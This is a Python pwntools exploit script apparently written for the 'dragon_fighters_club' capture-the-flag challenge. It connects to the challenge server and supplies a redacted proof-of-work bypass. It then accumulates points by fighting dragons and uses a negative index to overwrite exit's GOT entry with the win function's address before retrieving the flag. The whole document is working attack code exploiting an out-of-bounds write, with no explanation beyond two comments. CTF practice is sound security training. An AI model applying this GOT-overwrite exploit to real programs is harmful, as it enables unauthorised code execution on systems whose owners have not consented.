#!/usr/bin/env python3

import logging
import os
from pwn import *

logging.disable()

filename = os.path.join(os.path.dirname(__file__), "dragon_fighters_club")
exe = context.binary = ELF(args.EXE or filename, checksec=False)
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

HOST = os.environ.get("HOST", "dragonfightersclub.challs.external.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38303))

POW_BYPASS = 'redacted'

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return remote(HOST, PORT)

gdbscript = '''
'''.format(**locals())

# ==========================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
io.sendlineafter(b"Result:", f"99:{POW_BYPASS}".encode())

def you():
    io.sendlineafter(b"> ", b"1")
    res = io.recvline().strip().decode()
    return res

def dragons():
    io.sendlineafter(b"> ", b"2")
    res = b''.join(io.recvlines(10, keepends=True)).strip().decode()
    return res

def fight(i, damage):
    io.sendlineafter(b"> ", b"3");
    io.sendlineafter(b"> ", f"{i}".encode())
    res = io.recvline()
    if b"die?" in res:
        print(f"Cant fight {i} :(")
        return
    io.sendline(f"{damage}".encode())

def check_win():
    io.sendlineafter(b"> ", b"4")

def exit():
    io.sendlineafter(b"> ", b"5")

# Just getting enough points to beat exit's GOT dragon
for i in range(8):
    fight(i, 100)
for _ in range(75):
    fight(8, 1)

WIN = exe.symbols["win"]
EXIT_GOT = 0x04010b0

fight(-5, EXIT_GOT - WIN) # Overwrite exit's GOT with win
exit()

if args.GDB:
    io.interactive()
else:
    res = io.recvuntil(b"flag{").strip()
    print('flag{' + io.recvuntil(b'}').strip().decode())
